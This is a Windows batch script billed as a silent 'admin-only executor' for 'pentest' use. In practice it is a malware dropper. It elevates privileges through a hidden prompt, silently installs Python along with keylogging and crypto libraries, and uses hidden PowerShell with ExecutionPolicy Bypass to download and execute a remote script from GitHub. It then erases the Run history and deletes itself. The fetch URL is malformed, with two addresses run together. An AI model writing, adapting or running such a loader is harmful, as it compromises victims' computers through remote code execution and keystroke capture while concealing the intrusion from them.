@echo off
:: =============================================
:: Advanced Silent Admin-Only Executor
:: Version: 2.1 (Distroyer_Optimized)
:: =============================================

ver | find "10." >nul || ver | find "11." >nul || (
    echo [ERROR] Unsupported OS >nul
    exit /b
)

fsutil dirty query %SystemDrive% >nul 2>&1 || (
    echo [INFO] Elevating privileges >nul
    PowerShell -WindowStyle Hidden -Command "Start-Process -Verb RunAs -WindowStyle Hidden -FilePath '%~f0' -ArgumentList '/pentest'" >nul 2>&1
    exit /b
)

setlocal EnableDelayedExpansion
set "NULL=^>nul 2^>^&1"
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v "DisableCMD" /t REG_DWORD /d 0 /f %NULL%

where python %NULL% || (
    echo [INFO] Installing Python >nul
    bitsadmin /transfer pyDL /download /priority foreground https://www.python.org/ftp/python/3.12/python-3.12-amd64.exe %TEMP%\py_setup.msi %NULL%
    msiexec /i %TEMP%\py_setup.msi /quiet InstallAllUsers=1 PrependPath=1 AssociateFiles=0 Shortcuts=0 %NULL%
    timeout /t 3 /nobreak %NULL%
    del %TEMP%\py_setup.msi %NULL%

    setx PATH "%PATH%;%ProgramFiles%\Python312\;%ProgramFiles%\Python312\Scripts\" %NULL%
)

echo [INFO] Installing requirements >nul
python -m pip install --quiet --no-warn-script-location --disable-pip-version-check --user pywin32 pycryptodomex pynput requests >nul

echo [STATUS] Running security assessment >nul
PowerShell -WindowStyle Hidden -ExecutionPolicy Bypass -NoProfile -Command "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; iex (irm 'https://raw.githubusercontent.com/trusted_source/pentest_loader.pyhttps://raw.githubusercontent.com/distroyer57/Payload404/refs/heads/main/Backtrack.py')" %NULL%

echo [INFO] Cleaning artifacts >nul
del /q /f %TEMP%\*_setup.* %NULL%
reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU" /f %NULL%
echo ping 127.0.0.1 -n 3 ^>nul > "%TEMP%\cleanup.cmd"
echo del /f /q "%~f0" >> "%TEMP%\cleanup.cmd"
echo del /f /q "%TEMP%\cleanup.cmd" >> "%TEMP%\cleanup.cmd"

start /B cmd /c "%TEMP%\cleanup.cmd"
exit
